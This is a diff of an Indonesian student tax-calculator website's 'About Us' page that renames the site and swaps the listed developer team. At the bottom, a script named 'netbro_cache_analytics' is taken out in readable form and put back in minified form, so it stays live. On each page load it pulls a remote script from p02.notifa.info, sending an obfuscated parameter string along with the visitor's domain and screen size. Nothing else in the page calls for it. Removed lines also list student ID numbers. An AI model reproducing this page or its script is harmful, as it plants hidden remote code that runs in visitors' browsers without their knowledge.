@@ -3,13 +3,12 @@
 
 
 <!-- Mirrored from droitthemes.com/html/saasland/saasland-rtl/home-payment-style2.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 16 Oct 2019 06:53:46 GMT -->
-
 <head>
     <!-- Required meta tags -->
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
-    <title>Count Yours</title>
+    <title>Tax Generator</title>
     <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="css/bootstrap.min.css">
     <link rel="stylesheet" href="vendors/bootstrap-selector/css/bootstrap-select.min.css">
@@ -53,13 +52,13 @@
                                     Home
                                 </a>
                             </li>
-                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link" role="button" aria-haspopup="true" aria-expanded="false" href="/disclaimer">Disclaimer</a>
+                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link"  role="button" aria-haspopup="true" aria-expanded="false" href="/disclaimer">Disclaimer</a>
                             </li>
-                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link" role="button" aria-haspopup="true" aria-expanded="false" href="/privacy">Privacy Policy</a>
+                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link"  role="button" aria-haspopup="true" aria-expanded="false" href="/privacy">Privacy Policy</a>
                             </li>
                             </li>
                         </ul>
-                    </div>
+                        </div>
                     <a class="btn_get btn_hover hidden-sm hidden-xs" href="/aboutus">About Us</a>
                 </div>
             </nav>
@@ -69,14 +68,14 @@
             <div class="container">
                 <div class="breadcrumb_content text-center">
                     <h1 class="f_p f_700 f_size_50 w_color l_height50 mb_20">About Us</h1>
-                    <p class="f_400 w_color f_size_16 l_height26">Ini adalah halaman About Us<br>Website Count Yours</p>
+                    <p class="f_400 w_color f_size_16 l_height26">Ini adalah halaman About Us<br>Website Tax Generator</p>
                 </div>
             </div>
         </section>
         <section class="payment_features_two sec_pad">
             <div class="container">
                 <div class="sec_title text-center mb_70 wow fadeInUp" data-wow-delay="0.3s" style="visibility: visible; animation-delay: 0.3s; animation-name: fadeInUp;">
-                    <h2 class="f_p f_size_30 l_height50 f_700 t_color">COUNT YOURS</h2>
+                    <h2 class="f_p f_size_30 l_height50 f_700 t_color">TAX GENERATOR</h2>
                     <p class="f_400 f_size_18 l_height34">Adalah sebuat tools gratis yang bisa kamu gunakan<br>untuk membantu kamu dalam hal memprediksi Jumlah Pajak Yang Harus kamu Bayarkan</p>
                     <img src="img/ch3.png">
                 </div>
@@ -84,7 +83,7 @@
                     <div class="col-lg-3 col-sm-6">
                         <div class="payment_features_item text-center">
                             <img src="img/new/icon8.png" alt="">
-                            <h4>Count Yours</h4>
+                            <h4>Tax Generator</h4>
                             <p>Website kami mampu untuk membuat perkiraan jumlah pajak yang harus anda bayarkan berdasarkan data yang anda input.<br><br></p>
                         </div>
                     </div>
@@ -92,7 +91,7 @@
                         <div class="payment_features_item text-center">
                             <img src="img/new/icon7.png" alt="">
                             <h4>Responsive</h4>
-                            <p>Count Yours merupakan website yang bisa digunakan semua perangkat yang anda miliki, karena website ini sangat responsive.</p>
+                            <p>Tax Generator merupakan website yang bisa digunakan semua perangkat yang anda miliki, karena website ini sangat responsive.</p>
                         </div>
                     </div>
                     <div class="col-lg-3 col-sm-6">
@@ -113,67 +112,103 @@
             </div>
         </section>
         <section class="experts_team_area sec_pad">
-            <div class="container">
-                <div class="sec_title text-center mb_70">
-                    <h2 class="f_p f_size_30 l_height30 f_700 t_color3 mb_20">Count Yours Expert Team</h2>
-                    <p class="f_400 f_size_16">Website Count Yours ini dibangun dengan penuh cinta<br> Oleh kami para web developer Informatika Unsyiah</p>
-                </div>
-                <div class="row">
-                    <div class="col-lg-3 col-sm-6">
-                        <div class="ex_team_item">
-                            <img src="img/stefhani.png" alt="">
-                            <div class="team_content">
-                                <a href="#">
-                                    <h3 class="f_p f_size_16 f_600 t_color3">Stefhani Alba Siregar</h3>
-                                </a>
-                                <h5>2008107010057</h5>
-                            </div>
-                            <div class="hover_content">
-                                <div class="n_hover_content">
-                                    <ul class="list-unstyled">
-                                        <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
-                                        <li><a href="#"><i class="fab fa-twitter"></i></a></li>
-                                        <li><a href="#"><i class="fab fa-vimeo-v"></i></a></li>
-                                        <li><a href="#"><i class="fab fa-linkedin-in"></i></a></li>
-                                    </ul>
-                                    <div class="br"></div>
-                                    <a href="#">
-                                        <h3 class="f_p f_size_16 f_600 w_color">Stefhani Alba Siregar</h3>
-                                    </a>
-                                    <h5>2008107010057</h5>
-                                </div>
+        <div class="container">
+            <div class="sec_title text-center mb_70">
+                <h2 class="f_p f_size_30 l_height30 f_700 t_color3 mb_20">Tax Generator Expert Team</h2>
+                <p class="f_400 f_size_16">Website Tax Generator ini dibangun dengan penuh cinta<br> Oleh kami para web developer Informatika Unsyiah</p>
+            </div>
+            <div class="row">
+                <div class="col-lg-3 col-sm-6">
+                    <div class="ex_team_item">
+                        <img src="img/faris.png" alt="">
+                        <div class="team_content">
+                            <a href="#"><h3 class="f_p f_size_16 f_600 t_color3">Faris Izzatur Rahman</h3></a>
+                            <h5>Backend Developer</h5>
+                        </div>
+                        <div class="hover_content">
+                            <div class="n_hover_content">
+                                <ul class="list-unstyled">
+                                    <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
+                                    <li><a href="#"><i class="fab fa-twitter"></i></a></li>
+                                    <li><a href="#"><i class="fab fa-vimeo-v"></i></a></li>
+                                    <li><a href="#"><i class="fab fa-linkedin-in"></i></a></li>
+                                </ul>
+                                <div class="br"></div>
+                                <a href="#"><h3 class="f_p f_size_16 f_600 w_color">Faris Izzatur Rahman</h3></a>
+                                <h5>Backend Developer</h5>
                             </div>
                         </div>
                     </div>
-                    <div class="col-lg-3 col-sm-6">
-                        <div class="ex_team_item">
-                            <img src="img/farrah.png" alt="">
-                            <div class="team_content">
-                                <a href="#">
-                                    <h3 class="f_p f_size_16 f_600 t_color3">Farrah Fahira Murzani</h3>
-                                </a>
-                                <h5>2008107010062</h5>
+                </div>
+                <div class="col-lg-3 col-sm-6">
+                    <div class="ex_team_item">
+                        <img src="img/aad.png" alt="">
+                        <div class="team_content">
+                            <a href="#"><h3 class="f_p f_size_16 f_600 t_color3">Hafad Furqani</h3></a>
+                            <h5>Database Management</h5>
+                        </div>
+                        <div class="hover_content">
+                            <div class="n_hover_content">
+                                <ul class="list-unstyled">
+                                    <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
+                                    <li><a href="#"><i class="fab fa-twitter"></i></a></li>
+                                    <li><a href="#"><i class="fab fa-vimeo-v"></i></a></li>
+                                    <li><a href="#"><i class="fab fa-linkedin-in"></i></a></li>
+                                </ul>
+                                <div class="br"></div>
+                                <a href="#"><h3 class="f_p f_size_16 f_600 w_color">Hafad Furqani</h3></a>
+                                <h5>Database Management</h5>
                             </div>
-                            <div class="hover_content">
-                                <div class="n_hover_content">
-                                    <ul class="list-unstyled">
-                                        <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
-                                        <li><a href="#"><i class="fab fa-twitter"></i></a></li>
-                                        <li><a href="#"><i class="fab fa-vimeo-v"></i></a></li>
-                                        <li><a href="#"><i class="fab fa-linkedin-in"></i></a></li>
-                                    </ul>
-                                    <div class="br"></div>
-                                    <a href="#">
-                                        <h3 class="f_p f_size_16 f_600 w_color">Farrah Fahira Murzani</h3>
-                                    </a>
-                                    <h5>2008107010062</h5>
-                                </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-3 col-sm-6">
+                    <div class="ex_team_item">
+                        <img src="img/kiky.png" alt="">
+                        <div class="team_content">
+                            <a href="#"><h3 class="f_p f_size_16 f_600 t_color3">M. Rizki Riswandi</h3></a>
+                            <h5>Frontend Developer</h5>
+                        </div>
+                        <div class="hover_content">
+                            <div class="n_hover_content">
+                                <ul class="list-unstyled">
+                                    <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
+                                    <li><a href="#"><i class="fab fa-twitter"></i></a></li>
+                                    <li><a href="#"><i class="fab fa-vimeo-v"></i></a></li>
+                                    <li><a href="#"><i class="fab fa-linkedin-in"></i></a></li>
+                                </ul>
+                                <div class="br"></div>
+                                <a href="#"><h3 class="f_p f_size_16 f_600 w_color">M. Rizki Riswandi</h3></a>
+                                <h5>Frontend Developer</h5>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-3 col-sm-6">
+                    <div class="ex_team_item">
+                        <img src="img/rico.png" alt="">
+                        <div class="team_content">
+                            <a href="#"><h3 class="f_p f_size_16 f_600 t_color3">Rico Halim</h3></a>
+                            <h5>Backend Developer</h5>
+                        </div>
+                        <div class="hover_content">
+                            <div class="n_hover_content">
+                                <ul class="list-unstyled">
+                                    <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
+                                    <li><a href="#"><i class="fab fa-twitter"></i></a></li>
+                                    <li><a href="#"><i class="fab fa-vimeo-v"></i></a></li>
+                                    <li><a href="#"><i class="fab fa-linkedin-in"></i></a></li>
+                                </ul>
+                                <div class="br"></div>
+                                <a href="#"><h3 class="f_p f_size_16 f_600 w_color">Rico Halim</h3></a>
+                                <h5>Backend Developer</h5>
                             </div>
                         </div>
                     </div>
                 </div>
             </div>
-        </section>
+        </div>
+    </section>
         <section class="payment_priceing_area">
             <div class="container">
                 <div class="sec_title mb_70 wow fadeInUp text-center" data-wow-delay="0.4s">
@@ -203,9 +238,7 @@
                         <div class="col-lg-4 col-sm-6">
                             <div class="f_widget company_widget">
                                 <a href="/home" class="f-logo"><img src="img/bigtaxlogo.png" srcset="img/logo-3-2x.png 2x" alt="logo"></a>
-                                <p class="mt_40">Count Yours adalah sebuah website yang memberikan tools gratis untuk menghitung taksiran pajak yang wajib kamu bayarkan.<br>
-                                <h6 style="color:white;">Copyright © 2022 CountYours.com</h6>
-                                </p>
+                                <p class="mt_40">Tax Generator adalah sebuah website yang memberikan tools gratis untuk menghitung taksiran pajak yang wajib kamu bayarkan.<br><h6 style="color:white;">Copyright © 2020 TaxGenerator.com</h6></p>
                             </div>
                         </div>
                         <div class="col-lg-3 col-sm-6">
@@ -222,8 +255,10 @@
                             <div class="f_widget about-widget">
                                 <h3 class="f-title f_600 w_color f_size_18 mb_40">Our Developer</h3>
                                 <ul class="list-unstyled f_list">
-                                    <li><a href="#">Stefhani Alba Siregar</a></li>
-                                    <li><a href="#">Farrah Fahira Murzani</a></li>>
+                                    <li><a href="#">Faris Izzatur Rahman</a></li>
+                                    <li><a href="#">Hafad Furqani</a></li>
+                                    <li><a href="#">M. Rizki Riswandi</a></li>
+                                    <li><a href="#">Rico Halim</a></li>
                                 </ul>
                             </div>
                         </div>
@@ -260,35 +295,8 @@
     <script src="vendors/scroll/jquery.mCustomScrollbar.concat.min.js"></script>
     <script src="js/plugins.js"></script>
     <script src="js/main.js"></script>
-    <script type="text/javascript">
-        if (self == top) {
-            function netbro_cache_analytics(fn, callback) {
-                setTimeout(function() {
-                    fn();
-                    callback();
-                }, 0);
-            }
-
-            function sync(fn) {
-                fn();
-            }
-
-            function requestCfs() {
-                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
-                var idc_glo_r = Math.floor(Math.random() * 99999999999);
-                var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAqF6HNGDGrVsZAqar7gKYCxHUwpJkvUk0FTB7z3dXOJ1JGX3Bj4HEAwqwT3SZjxU6wdqRQ4j5nJ8LgeLRWeUrnFnDbOeg3Cp8VqSWsFFqs4OoQDy%2f6BHafq4VSx8RIARGzzRgTdV9n%2bL7RMyvKCHBIiwm4Ou7R6pdpPlTboDCm8ciZQrMEfVSeEdxvCe%2bdA51LzX1wFJOBkiNAv8XMiin%2fu0hPwNxJVFBStPFmNgQ4mSw3QgFwxnx04oTew7xtjvIGH6uq535UpulobPZ4Yy4r8C7wHE5jNy1qSTi%2bXDGTpmtObPczjOeaps%2byJU0q%2bUz6LC5SPGo0Z8XCtbI6f0ILlHyFaWvdrqkXVQx7uu%2fG4rtAb6%2by2QsriOUTTHi0Y084oPMLC6S8KiEh7719HrPzblBrr3cSLlxRgmIjkq2UMt%2bz8B2lbiXysKHtsuuS2GHrIYLepAtE2sJ7ffRlB6chqlUIF95Mhz8yqLtORY8Op7aoRiPfkRpTMzcizC5M%2bKQDZ2xJFk2WjfRUwjiTyAtug%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
-                var bsa = document.createElement('script');
-                bsa.type = 'text/javascript';
-                bsa.async = true;
-                bsa.src = url;
-                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
-            }
-            netbro_cache_analytics(requestCfs, function() {});
-        };
-    </script>
-</body>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAqF6HNGDGrVsZAqar7gKYCxHUwpJkvUk0FTB7z3dXOJ1JGX3Bj4HEAwqwT3SZjxU6wdqRQ4j5nJ8LgeLRWeUrnFnDbOeg3Cp8VqSWsFFqs4OoQDy%2f6BHafq4VSx8RIARGzzRgTdV9n%2bL7RMyvKCHBIiwm4Ou7R6pdpPlTboDCm8ciZQrMEfVSeEdxvCe%2bdA51LzX1wFJOBkiNAv8XMiin%2fu0hPwNxJVFBStPFmNgQ4mSw3QgFwxnx04oTew7xtjvIGH6uq535UpulobPZ4Yy4r8C7wHE5jNy1qSTi%2bXDGTpmtObPczjOeaps%2byJU0q%2bUz6LC5SPGo0Z8XCtbI6f0ILlHyFaWvdrqkXVQx7uu%2fG4rtAb6%2by2QsriOUTTHi0Y084oPMLC6S8KiEh7719HrPzblBrr3cSLlxRgmIjkq2UMt%2bz8B2lbiXysKHtsuuS2GHrIYLepAtE2sJ7ffRlB6chqlUIF95Mhz8yqLtORY8Op7aoRiPfkRpTMzcizC5M%2bKQDZ2xJFk2WjfRUwjiTyAtug%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
 
 <!-- Mirrored from droitthemes.com/html/saasland/saasland-rtl/home-payment-style2.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 16 Oct 2019 06:54:12 GMT -->
-
 </html>
